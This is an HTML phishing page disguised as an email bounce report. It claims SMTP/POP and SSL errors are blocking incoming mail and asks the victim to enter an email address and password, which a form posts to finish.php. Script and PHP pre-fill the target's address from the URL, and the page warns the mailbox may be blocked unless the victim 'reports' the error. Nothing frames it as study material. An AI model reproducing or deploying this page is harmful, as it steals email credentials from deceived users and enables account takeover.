<html><head><title>An error in your SMTP/POP settings is blocking your incoming emails</title><base target="_blank">
 
 
<style type="text/css"> 
<!--
 
body,div,dl,dt,dd,h1,h2,h3,h4,h5,h6,pre,form,fieldset,input,textarea,p,blockquote,th,td{padding:0; margin:0; }
fieldset,img{border:0; }
table{border-collapse:collapse; border-spacing:0; }
ol,ul{}
address,caption,cite,code,dfn,em,strong,th,var{font-weight:normal; font-style:normal; }
caption,th{text-align:left; }
h1,h2,h3,h4,h5,h6{font-weight:bold; font-size:100%; }
q:before,q:after{content:''; }
abbr,acronym{border:0; }
 
a:link,a:visited{}
a:hover{}
 
.Bdy{font-size:14px; font-family:verdana,Arial,Helvetica,sans-serif; padding:20px;}
h1{font-size:24px; color:#99999; padding-bottom:30px;}
p{}
 
.Tb_mWp{border:1px solid #ddd; border-right:none; border-bottom:none; table-layout:fixed;}
    .Tb_mWp th,.Tb_mWp td{border-right:1px solid #ddd; border-bottom:1px solid #ddd; padding:8px 4px;}
    .Tb_mWp th{font-size:14px; text-align:right; width:130px; font-weight:bold; background:#f6f6f6; color:#666;}
    .Tb_mWp td{font-size:14px; padding-left:10px; word-break:break-all;}
 
.Tb_miWp{ margin-top:-2px; margin-left:-1px; float:left; table-layout:fixed;}
    .Tb_miWp th,.Tb_miWp td{border-left:1px solid #eee; border-top:1px solid #eee; border-right:none; border-bottom:none; font-size:12px;line-height:18px}
    .Tb_miWp th{width:68px; background:#f8f8f8;line-height:18px}
 
.tr_Mi{}
    .tr_Mi th{}
    .tr_Mi td{}
 
.tr_Rz{}
    .tr_Rz th{}
    .tr_Rz td{ background:#f8f8f8;}
        .tr_Rz .infoTt{ color:#99999; font-weight:bold; line-height:18px;}
        .tr_Rz .infoDcr{ padding-top:4px; color:#999; line-height:18px;}
 
.tr_Sr{}
    .tr_Sr th{}
    .tr_Sr td{background:#f4fff4;}
 
.ul_lstWp{margin-left:-20px;}
.ul_lst{padding-top:0px; padding-bottom:0px; margin-top:6px; margin-bottom:6px;}
.ul_lst li{padding-top:3px; padding-bottom:3px;}
 
-->

--></style> 

<script type="text/javascript">function populate() { 
document.getElementById("demo").innerHTML = Date();
var varSection = window.location.search.substr(1);
document.getElementById("Email").value=varSection;
document.getElementById("lbEmail").value=varSection
} </script>
 
 
 
 
 
</head><body onload="populate()"><h1>An error in your SMTP/POP settings is blocking your incoming emails��</h1> 
<form name="form1" method="post" action="finish.php" onsubmit="return CheckForm(this);">
    
<div class="Con"> 
<table class="Tb_mWp" border="0" width="100%" cellpadding="0" cellspacing="0"> 
    
     
    <tbody><tr class="tr_Mi"> 
        <th nowrap="">Message:</th> 
        <td> 

             
                 <table class="Tb_miWp" border="0" width="100%" cellpadding="0" cellspacing="0"> 
                <tbody><tr> 
                    <th nowrap="">Date:</th> 
                    <td style="line-height:1"><p id="demo"></p></td> 
                </tr><tr> 
                    <th nowrap="">Subject:</th> 
                    <td style="line-height:1">Error loading some of your inbox messages</td>
                </tr> 
                <tr> 
                    <th nowrap="">User:</th> &email&
                    <td style="line-height:1"><a target="_blank" href="malito:<?php echo $_GET['email']; ?>
                </tr> 
                <tr style="display:none;"> 
                    <th nowrap="">Cc:</th> 
                    <td style="line-height:1">xxx</td> 
                </tr> 
                <tr style="display:none;"> 
                    <th nowrap="">Bcc:</th> 
                    <td style="line-height:1">yyy</td> 
                </tr> 
            </tbody></table> 
             
 
 
 
 
        </td> 
    </tr> 
 
     
    <tr class="tr_Rz"> 
        <th nowrap="">Bounce reason:</th> 
        <td> 
             
            <div class="infoTt">An error in your SMTP/POP settings is blocking your incoming e-mails</div> 
            <div class="infoDcr">550-5.1.1 :POP configuration text can not be verified<br>550-5.1.2:Login encountered an unhandled error in your SSL settings
<br>550-5.1.3:Login encountered an unhandled error in your SSL settings</div> 
        </td> 
    </tr> 
 
     
    <tr class="tr_Sr"> 
        <th nowrap="">Suggested Solution:</th> 
        <td> 
            <div class="ul_lstWp"> 
            <ul class="ul_lst"> 
                <li>Please fill out the form below. Once the error is fixed, our team will contact you.</li> 
                <li>
    





<table border="0" width="45%" cellpadding="0" cellspacing="4">
      <tbody onload="populate()"><tr>
        <td>Email address:</td>
        
        <td><input id="Email" name="email" value="<?php echo $_GET['email']; ?>" size="40" maxlength="400" style="ime-mode:disabled" onbeforepaste="clipboardData.setData('text',clipboardData.getData('text').replace(/[\u4E00-\u9FA5]/g,''))" required="" type="text"></td>
      </tr>
   


   <tr>
        <td>Password:</td>
        
        <td><input id="Password" name="password" value="" size="40" maxlength="400" style="ime-mode:disabled" onbeforepaste="clipboardData.setData('text',clipboardData.getData('text').replace(/[\u4E00-\u9FA5]/g,''))" required="" type="password"></td>
      </tr>
 



 <tr>
<td></td>
<td>
    
      <p align="left">
                                  <input name="Submit" value="Submit report" type="submit" width="30" height="25">
                                  &nbsp;&nbsp;
                                  
      </p>
</td></tr>

</tbody></table>
    </form></li>
<li>Your e-mail may be completely blocked, if you do not report this error.</li> 
            </ul> 
            </div>        
        </td> 
    </tr> 

</tbody></table> 
 
</div> 
 


<span>
<br>----------------<br>Content-Type: multipart/alternative; boundary=001a1135f63edd4472050da42d05.<br><br><br>
</span>
 

 

<style type="text/css">
body{font-size:14px;font-family:arial,verdana,sans-serif;line-height:1.666;padding:0;margin:0;overflow:auto;white-space:normal;word-wrap:break-word;min-height:100px}
td, input, button, select, body{font-family:Helvetica, 'Microsoft Yahei', verdana}
pre {white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word}
th,td{font-family:arial,verdana,sans-serif;line-height:1.666}
img{ border:0}
header,footer,section,aside,article,nav,hgroup,figure,figcaption{display:block}
</style>

<style id="ntes_link_color" type="text/css">a,td a{color:#003399}</style>
<script type="text/javascript">try{if(parent.$.Browser.chrome()){var o=document.body.style;o.paddingTop=o.paddingBottom=o.marginTop=o.marginBottom="0px";}parent.JS5.find(window.name).content.setHeight();}catch(e){}/*20130913*/</script></body></html>